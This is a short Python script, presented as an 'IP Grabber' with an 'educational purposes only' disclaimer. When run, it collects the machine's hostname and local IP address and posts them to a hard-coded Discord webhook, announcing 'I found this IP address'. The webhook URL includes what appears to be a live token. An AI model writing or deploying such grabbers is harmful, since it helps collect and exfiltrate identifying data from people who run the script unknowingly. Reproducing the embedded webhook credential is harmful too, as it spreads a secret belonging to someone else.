"""
IP Grabber
  By Manana

Quick Note :
  This Code Is Just For Educational (And Fun) Purposes ONLY !
  PLEASE DO NOT RUN THIS CODE ON SOMEONES PC ! (I mean like you can run it on you're own pc if the webhook inputted is privately yours)

More Info :
  If you want more of this please follow me on Twitter (@mananatheone) or in GitHub (github.com/MananaTheOne)
"""
import requests
import socket


DiscordWebhook = "https://discord.com/api/webhooks/897350002949640202/022DWdvntFKxbhZMZLJLqwF2u7yoLopgZj0WLOlIObozwRBXtzed7U8cWrZCD5amZ0AL" # Put discord webhook as a string.

hostname = socket.gethostname()
current_local_ip = socket.gethostbyname(hostname) # Grabs Local PC IP Address (Or Router Ip Address)


requests.post(url=DiscordWebhook, json={ # Posts this JSON request to the webhooks (which discoord api processes and uses the json data to send as a message.)
    "username":"Mr. Hecker",
    "content":"@everyone I found this IP address",
    "avatar_url":"https://www.pandasecurity.com/en/mediacenter/src/uploads/2019/07/pandasecurity-How-do-hackers-pick-their-targets.jpg", # I Picked this image from google images because it looks funny lmao
    "embeds" : [
        {
            "title":"Manana's IP Grabber",
            "description":f"{hostname}'s IP Address\n\n:link: `{current_local_ip}`",
            "color":0xffffff
        }
    ]
})
